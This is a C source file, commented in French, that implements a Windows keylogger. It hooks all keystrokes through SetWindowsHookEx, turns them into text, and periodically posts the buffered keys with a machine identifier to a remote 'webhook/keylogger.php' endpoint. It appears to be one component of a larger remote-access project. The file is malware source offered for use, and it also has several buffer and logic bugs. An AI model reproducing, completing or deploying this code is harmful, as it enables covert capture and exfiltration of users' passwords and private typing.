#include <windows.h>
#include <stdio.h>
#include <time.h> 
#include <stdlib.h>
#include "../include/structures.h"
#include "../include/uid.h"
//#include "http.h"

#define MAX_KEYS 100

char key_log[MAX_KEYS*10];
int current_key_log_size = 0;


void key_code_to_string(int key, char *string_key, int value_in_string_key){
    /*
    Fonction qui détecte la touche tapé via son key_code (valeur de la toouche du clavier)
    ce n'est pas de l'ASCII
    */

    /* 
    
    VALEUR -> correspondance
        de 49 à 57: chiffres de 0 à 9  que si maj préssé
        de 65 à 90: lettres (A-Z)
        160: majuscule
        223: point d'exclamation
        de 96 à 105: chiffres de 0 à 9 (sur le pavé numérique)
        20: verr maj

        à compléter
    
    */

    switch (key) {
        case 20:
            strcpy(string_key, "[VERR_MAJ]");
            break;
    
        case 27:
            strcpy(string_key, "[ECHAP]");
            break;

        case 160:
            strcpy(string_key, "[MAJ]");
            break;

        case 162:
            strcpy(string_key, "[CTRL]");
            break;

        case 163:
            strcpy(string_key, "[CTRL]");
            break;

        case 8:
            strcpy(string_key, "[RETOUR_ARRIERE]");
            break;

        case 9:
            strcpy(string_key, "[TAB]");
            break;

        case 91:
            strcpy(string_key, "[WINDOWS]");
            break;
        
        case 13:
            strcpy(string_key, "[ENTREE]");
            break;        

        case 190:
            strcpy(string_key, ";");
            break;
    
        case 188:
            strcpy(string_key, ",");
            break;

        case 223:
            strcpy(string_key, "!");
            break;

        case 191:
            strcpy(string_key, ":");
            break;

        case 187:
            strcpy(string_key, "=");
            break;

        case 186:
            strcpy(string_key, "$");
            break;

        case 226:
            strcpy(string_key, "<");
            break;

        default:
            if (key >= 49 && key <= 57) {
                string_key[0] = (char)key;
                string_key[1] = '\0';  // null byte -> https://zestedesavoir.com/tutoriels/755/le-langage-c-1/1043_aggregats-memoire-et-fichiers/4283_les-chaines-de-caracteres/#avec-une-sentinelle
            } else if (key >= 65 && key <= 90) {
                string_key[0] = (char)key; 
                string_key[1] = '\0';
            } else if(key >= 96 && key <= 105){
                string_key[0] = (char)(key - 48); // le nombre associé a la touche 47 = 49 (les numeros de 0 à 9)-96
                string_key[1] = '\0';    
            }else if(key >= 112 && key <= 123){
                //F1...
                string_key[0] = 'F';
                string_key[1] = (char)(key-111);
                printf("%d\n", (char)(key-111));
                string_key[2] = '\0';
                
            }else{
                value_in_string_key = 0;
            }   
            break;
    }
}

void send_keys(void){

    /*Permet d'envoyer les frappes de claviers au serveur et de vider le tableau  key_log*/
    char uid[30]; 
    get_uid(uid);

    char data[MAX_KEYS+50];
    snprintf(data, MAX_KEYS+50, "{\"uid\":\"%s\",\"keys\": \"%s\"}",uid, key_log);
    memset(key_log, 0, sizeof(MAX_KEYS)); // vider le tableau
    current_key_log_size = 0;
    
    send_to_server("webhook/keylogger.php", data);
}


void log_key(int key) {

    /*Permet d'enregistrer les frappes de claviers dans le tab key_log*/
    char string_key[15];
    int value_in_string_key = 1;
    key_code_to_string(key, string_key, value_in_string_key);

    if(value_in_string_key){
        printf("%s, %d \n", string_key,key);
        snprintf(key_log, 1024, "%s%s", key_log, string_key); // rajoute le caractère dans key_log
        current_key_log_size++; // +=1
        if(current_key_log_size >= MAX_KEYS){ //vérifier si l'utilisateur à taper assez pour envoyer les clefs au server
            send_keys();
        }  
    }

}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {

    /*Fonction de callback qui est associé à SetWindowsHookEx plus bas et qui envoie l'entier "key_code" 
    dans log_key()*/

    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT *)lParam;
        
        if (wParam == WM_KEYDOWN) {
            log_key(kbdStruct->vkCode);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int start_keylogger() {

    /*Fonction qui permet je lançer le keylogger grâce aux fonctions de windows.h*/

    printf("[*] Lancement du keylogger, envoie des frappes au serveur toute les %d frappes\n", MAX_KEYS);

    /* initialisation du hook permety d'eregistrer l'evennement système WH_KEYBOARD_LL (les frappes au clavier)
       et la fonction de callback est KeyboardProc

       https://learn.microsoft.com/fr-fr/windows/win32/api/winuser/nf-winuser-setwindowshookexa
    */
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);


    // Si l'initialisation marche pas
    if (keyboardHook == NULL) {
        printf("[-] Erreur su l'initatisation du keylogger\n");
        return 1;
    }


    // un message est un êvennement 
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboardHook); //supprime le hook
    return 0;
}
